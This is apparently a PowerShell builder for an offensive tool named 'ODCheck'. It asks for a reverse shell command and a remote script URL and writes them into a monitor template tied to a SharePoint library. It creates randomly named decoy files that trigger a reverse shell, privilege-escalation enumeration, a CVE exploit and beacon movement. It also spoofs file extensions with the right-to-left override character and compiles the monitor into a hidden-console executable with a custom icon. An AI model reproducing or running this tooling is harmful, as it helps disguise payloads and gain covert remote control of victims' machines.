$monitorScriptPath = ".\monitor.ps1"
$templateFilePath = ".\monitor_template.ps1"
$filesFolder = ".\Files"
$payloadsFolder = ".\Payloads"

function Generate-RandomFilename {
    param (
        [int]$Length
    )
    $validCharacters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    $filename = ''
    for ($i = 0; $i -lt $Length; $i++) {
        $filename += $validCharacters[(Get-Random -Minimum 0 -Maximum $validCharacters.Length)]
    }
    return $filename
}

function Customize-Filenames {
    try {
        $tenant = Read-Host "Enter the tenant name"
        $library = Read-Host "Enter the SharePoint library name"
	$pshell = Read-Host "Reverse shell command"
	$phandler = Read-Host "URL for remote PowerShell script"

        $minLength = 6
        $maxLength = 12

        $file1 = (Generate-RandomFilename -Length (Get-Random -Minimum $minLength -Maximum $maxLength)) + ".txt"
        $file2 = (Generate-RandomFilename -Length (Get-Random -Minimum $minLength -Maximum $maxLength)) + ".jpg"
        $file3 = (Generate-RandomFilename -Length (Get-Random -Minimum $minLength -Maximum $maxLength)) + ".pdf"
        $file4 = (Generate-RandomFilename -Length (Get-Random -Minimum $minLength -Maximum $maxLength)) + ".docx"
        $file5 = (Generate-RandomFilename -Length (Get-Random -Minimum $minLength -Maximum $maxLength)) + ".png"

        Write-Host ""
	Write-Host "Generated filenames:"
        Write-Host "File 1: $file1 - Default: Priv Esc Enumeration"
        Write-Host "File 2: $file2 - Default: Trigger Reverse Shell" 
        Write-Host "File 3: $file3 - Default: Trigger CVE-2023-32214"
        Write-Host "File 4: $file4 - Default: Trigger Remote Powershell Script"
        Write-Host "File 5: $file5 - Default : Attempts to move an beacon to another folder"

        $monitorContent = Get-Content $templateFilePath -Raw

        $monitorContent = $monitorContent.Replace('{{FILE1}}', $file1)
        $monitorContent = $monitorContent.Replace('{{FILE2}}', $file2)
        $monitorContent = $monitorContent.Replace('{{FILE3}}', $file3)
        $monitorContent = $monitorContent.Replace('{{FILE4}}', $file4)
        $monitorContent = $monitorContent.Replace('{{FILE5}}', $file5)
        $monitorContent = $monitorContent.Replace('{{TENANT}}', $tenant)
        $monitorContent = $monitorContent.Replace('{{LIBRARY}}', $library)
        $monitorContent = $monitorContent.Replace('{{PSHELL}}', $pshell)
        $monitorContent = $monitorContent.Replace('{{PHANDLER}}', $phandler)

        $monitorContent | Set-Content $monitorScriptPath -Encoding UTF8

        $sourceFolder = ".\Files"
        $destinationFolder = ".\Payload"

        Copy-Item -Path "$sourceFolder\placeholder.txt" -Destination "$destinationFolder\$file1" -ErrorAction Stop
        Copy-Item -Path "$sourceFolder\placeholder.jpg" -Destination "$destinationFolder\$file2" -ErrorAction Stop
        Copy-Item -Path "$sourceFolder\placeholder.pdf" -Destination "$destinationFolder\$file3" -ErrorAction Stop
        Copy-Item -Path "$sourceFolder\placeholder.docx" -Destination "$destinationFolder\$file4" -ErrorAction Stop
        Copy-Item -Path "$sourceFolder\placeholder.png" -Destination "$destinationFolder\$file5" -ErrorAction Stop

        Write-Host ""
	Write-Host "Variable names in monitor.ps1 have been customized."
	Write-Host ""
	Write-Host "The placeholder files have been copied and renamed successfully!"
	Write-Host "Ready for the drop!"
    } catch {
        Write-Host "An error occurred while customizing file names and copying placeholder files: $_"
    }
}


function Apply-RTLO {
    try {
        $inputFile = Read-Host "Enter the file path:"
        $spoofedExtension = Read-Host "Enter the spoofed extension:"
        $spoofedExtension = $spoofedExtension.Trim()
	$reversedString = -join ($spoofedExtension[-1..-($spoofedExtension.Length)])

        if (-not (Test-Path -Path $inputFile -PathType Leaf)) {
            Write-Host "Input file does not exist: $inputFile"
            return
        }

        $directory = Split-Path -Path $inputFile
        $filename = [System.IO.Path]::GetFileNameWithoutExtension($inputFile)
        $extension = [System.IO.Path]::GetExtension($inputFile)

        $rtlo = [char]::ConvertFromUtf32(0x202E)
        $newFilename = "$filename$rtlo$reversedString$extension"
        $newFilePath = Join-Path -Path $directory -ChildPath $newFilename

        Rename-Item -Path $inputFile -NewName $newFilePath

        Write-Host "File renamed successfully: $newFilePath"
    } catch {
        Write-Host "Could not rename file: $_"
    }
}

function CreateODCheck {
    if (-not (Get-Command ps2exe -ErrorAction SilentlyContinue)) {
        Write-Host "PS2EXE is not found. Make sure PS2EXE is installed and accessible in your PATH."
        return
    }

    $customizeIcon = Read-Host "Do you want to customize the icon? (yes/no)"
    $iconFilePath = ""

    if ($customizeIcon -eq "yes") {
        # Prompt the user for the icon file path
        $iconFilePath = Read-Host "Enter the file path for the icon file (ICO)"
    }

    # Compile monitor.ps1 using PS2EXE
    if ($iconFilePath) {
        Invoke-ps2exe -inputfile monitor.ps1 -outputfile ODCheck.exe -iconFile $iconFilePath -noConsole
    } else {
        Invoke-ps2exe -inputfile monitor.ps1 -outputfile ODCheck.exe -noConsole
    }

    Write-Host "ODCheck has been created successfully as ODCheck.exe."
}

# Main menu loop
while ($true) {
Write-Host "   ____  _____   _____ _    _ ______ _____ _  __"
Write-Host "  / __ \|  __ \ / ____| |  | |  ____/ ____| |/ /"
Write-Host " | |  | | |  | | |    | |__| | |__ | |    | ' / "
Write-Host " | |  | | |  | | |    |  __  |  __|| |    |  <  "
Write-Host " | |__| | |__| | |____| |  | | |___| |____| . \ "
Write-Host "  \____/|_____/ \_____|_|  |_|______\_____|_|\_\"
Write-Host "                                                "
Write-Host "                                                "
    

Write-Host "`nChoose an option:`n(1) Configure ODCheck`n(2) Apply RTLO`n(3) Compile ODCheck`n(4) Exit`n"
    $option = Read-Host "Option"

    switch ($option) {
        1 { Customize-Filenames }
        2 { Apply-RTLO }
        3 { CreateODCheck }
        4 { return }
        default { Write-Host "Invalid option. Please choose again." }
   }
}